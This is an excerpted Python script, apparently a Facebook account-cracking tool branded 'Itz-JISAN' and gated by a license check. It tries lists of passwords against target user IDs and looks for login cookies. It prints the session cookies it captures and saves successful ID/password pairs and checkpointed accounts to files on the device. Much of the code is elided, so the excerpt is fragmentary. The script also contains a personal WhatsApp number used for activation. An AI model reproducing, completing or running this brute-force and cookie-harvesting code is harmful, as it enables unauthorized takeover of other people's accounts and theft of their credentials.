#𝙄𝙩𝙯-𝙅𝙄𝙎𝘼𝙉࿐❹❷⓿(MD HRUDOY KHAN)(ITZ-JISAN)
...
for xd in range(3005):
    ...
    uas.append(ff)
for 𝙄𝙩𝙯-𝙅𝙄𝙎𝘼𝙉࿐❹❷⓿ in range(9993,176281):
...
def menu_apikey():
  ...
  id = "→".join(uuid)
  server = requests.get('https://github.com/Itzjisan/xt/blob/main/Bangla.txt').text
...
$$    $$/ / $$   |$$    $$/ $$ |  $$ |$$ | $$$ |      
 $$$$$$/  $$$$$$/  $$$$$$/  $$/   $$/ $$/   $$/       
  ...
  try:
    httpCaht = requests.get("https://github.com/Itzjisan/xt/blob/main/Bangla.txt").text
    if id in httpCaht:
      ...
      os.system(f'xdg-open https://wa.me/+8801814649133?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/01814649133');time.sleep(1)
		admin()
	if bal =='2':
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93m𝙄𝙩𝙯-𝙅𝙄𝙎𝘼𝙉࿐❹❷⓿\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [𝙄𝙩𝙯-𝙅𝙄𝙎𝘼𝙉࿐❹❷⓿-OK] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m [♥] COOKIE : '+coki)
                open('/sdcard/𝙄𝙩𝙯-𝙅𝙄𝙎𝘼𝙉࿐❹❷⓿-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                open('/sdcard/𝙄𝙩𝙯-𝙅𝙄𝙎𝘼𝙉࿐❹❷⓿-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'\r\033[1;92m [🍪] COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/𝙄𝙩𝙯-𝙅𝙄𝙎𝘼𝙉࿐❹❷⓿-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
